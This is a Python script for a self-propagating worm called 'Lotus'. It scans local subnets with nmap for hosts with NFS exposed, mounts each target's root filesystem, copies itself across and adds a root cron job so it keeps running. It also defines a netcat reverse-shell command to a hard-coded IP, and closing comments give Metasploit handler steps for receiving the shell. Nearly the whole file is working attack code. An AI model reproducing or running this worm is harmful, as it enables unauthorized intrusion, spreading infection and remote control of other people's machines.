#! /usr/bin/env python3
import os
import nmap
import subprocess
from subprocess import Popen, PIPE
import base64
from os import path
ssh_command = "nc -nv 10.0.2.15 4444 -e /bin/bash"                               ## Add command and control server info here, as well as running the worm itself.
cron = "'* * * * * /Lotus/Lotus.py'"

def subnet():                                                                     #This runs first
    global h_ip                                                                   #Set a global variable to contain the host machine ip for use in check 3
    process = subprocess.Popen(['ifconfig'], stdout=subprocess.PIPE)              #Run ifconfig on the host machine
    stdout = process.communicate()[0]                                             #Read stdout from ifconfig
    stdout = str(stdout.strip())                                                  #Strip stdout and cast to s string
    stdout = stdout.split(' ')                                                    #Split stdout into a list at the '.'
    stdout = [i for i in stdout if i]                                             #Remove blank entries using list comprehension
    elem_list = []                                                                #Initialize a list for storing element numbers
    t = -1                                                                       #Starting element for loop to be increased each time to iterate through an entire list
    while True:                                                                   
        try:                                                                      #A try loop allows us to iterate through a list to the end then stop execution at the end of the list without an error
            t = stdout.index('inet', t + 1)                                       #The index of the element after the string 'inet' is added to elem_list
            elem_list.append(t + 1)
        except ValueError:                                                        #When the end of the list is reached a ValueError is thrown ending the loop
            break
    newelem_list = []                                                             #A new list is created to hold the elements named in elem_list
    for i in elem_list:                                                           #Create a loop to loop over the elements in elem_list as i
        newelem_list.append(stdout[i])                                            #The elements stored in 'stdout' at the index 'i' are added to 'newelem_list'
    newelem_list.remove('127.0.0.1')                                              #127.0.0.1 is removed from the results
    h_ip = newelem_list
    f_list = []                                                                   #The final list is created to hold the final ip's in Cider notation
    for i in newelem_list:                                                        #A for loop is created to transform the contents of 'newelem_list' into Cider notation
        o = i.split('.')                                                          #The ip stored in i is split into 4 elements at the '.' and stored in a list named 'o'
        o.pop()                                                                   #The last element is removed
        f_list.append(str(o[0] + '.' + o[1] + '.' + o[2] + '.' + '1' + '/24'))   #The ip is reconstructed into Cider notation and appended to 'f_list'
    return(f_list)                                                                #f_list is returned

def ssh():
    ssh_list = []
    print('Subnet detection complete, starting scan . . .')                                                                   #A list is created to contain valid ip's to exploit
    for ip_range in subnet():                                                       #The subnets returned from the subnet function are iterated over                                                             #Define a list to contain ip's open on port 22
        nm = nmap.PortScanner()                                                     #Instantiate portscanner object
        nm.scan(ip_range, '22, 111, 2049')                                                         #Scan ports 10.0.2.0 - 10.0.2.256
        for host in nm.all_hosts():                                                 #Create a for loop to iterate over the list of scanned hosts
            if nm[host]['tcp'][22]['state'] == 'open' and nm[host]['tcp'][111]['state'] == 'open' and nm[host]['tcp'][2049]['state'] == 'open':                              #Validate port 22 is open on 'host'
                ssh_list.append(host)                                               #Add validated hosts to ssh_list
    print('Scan Complete!')
    return(ssh_list)                                                                #Return the contents of ssh_list

def check2():                                                                      #A check to determine if our worm is already installed on a target
    target_list = []                                                                #Create a list to hold valid target ip's without our worm installed
    for ip in ssh():                                                             #Iterate over the ip's returned from the 'ssh' function        
        if ip not in h_ip:
            os.makedirs('/tmp/r00t', exist_ok = True)                                   #Create directory '/tmp/r00t' if not already there
            subprocess.run(['mount -t nfs ' + str(ip) +  ':/ /tmp/r00t/'], shell=True)         #Exploit smb to mount target root directory to '/tmp/r00t'
            if path.exists('/tmp/r00t/Lotus') != True:                                  #if our worm is not found in '/tmp/r000t/':
                target_list.append(ip)                                                  #The ip is added to target_list
    if len(target_list) == 0:
        print('No Valid Targets!')
    else:
        print('Target(s) validated:' + str(target_list))
        return(target_list)                                                             #target_list is returned

def worm():
    try:
        for ip in check2():
            print('Starting Worm . . .')
            os.makedirs('/tmp/r00t', exist_ok = True)
            subprocess.run(['mount -t nfs ' + str(ip) + ':/ /tmp/r00t/'], shell=True)
            subprocess.run(['cp', '-r', '/Lotus', '/tmp/r00t'])
            print('Copying complete, adding cronjob')
            subprocess.run(["export EDITOR='vim'"], shell = True)
            subprocess.run(["echo " + cron + " >> /tmp/r00t/var/spool/cron/crontabs/root"], shell=True)
            subprocess.run(['umount /tmp/r00t'], shell=True)
            print('Complete!')
    except:
        pass

def check1():
    if path.exists('/Lotus') == True:
        print('Root Path Found')
        worm()
    elif path.exists('/Lotus') == False:
        print('Root file not found, creating . . .')
        cwd = os.getcwd()
        subprocess.run(['cp', '-r', cwd, '/Lotus'])
        worm()
def main():
    check1()
if __name__ == '__main__':
    main()




## TO RUN METASPLOIT HANDLER, ENSURE CORRECT IP IS SET IN "ssh_command" VARIABLE
#msfconsole
#use /exploit/multi/handler
#set payload linux/x86/shell/reverse_tcp
#set LHOST
#set LPORT
#run
